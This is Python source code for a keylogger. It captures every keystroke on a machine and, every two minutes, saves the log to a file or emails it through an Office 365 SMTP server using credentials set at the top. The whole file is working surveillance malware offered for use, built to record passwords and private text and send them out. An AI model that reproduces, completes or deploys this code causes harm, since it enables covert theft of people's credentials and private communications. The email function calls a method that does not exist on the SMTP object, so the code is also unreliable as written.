import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SAVE_REPORT_EVERY = 120 # seconds
EMAIL_ADDRESS = "" # your email address
EMAIL_PASSWORD = "" # your email password

class Keylogger:
    # constructor
    def __init__(self, interval, method="email"):
        self.interval = interval
        self.method = method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # reading the key pressed
    def on_key_down(self, event):
        name = event.name
        if len (name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    # defining the filename and update it evry time report_logs is called
    def define_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    # saving the report to a file
    def save_report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    # preparing the content of the mail
    def prepare_mail(self, message):
        msg = MIMEMultipart("Alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger Report"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    # sending the report to the email
    def save_report_to_mail(self,email, password, message, verbose = 1):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.save_report_to_mail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
    
    # adding logs to the report
    def report_logs(self):
        if self.log:
            self.end_dt = datetime.now()
            self.define_filename()
            if self.method == "email":
                self.save_report_to_mail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.method == "file":
                self.save_report_to_file()
            print(f"[{self.filename}] - saved")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report_logs)
        timer.daemon = True
        timer.start()

    # start the keylogger
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.on_key_down)
        self.report_logs()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

    # run program
if __name__ == "__main__":
    Keylogger = Keylogger(interval=SAVE_REPORT_EVERY, method="file")
    Keylogger.start()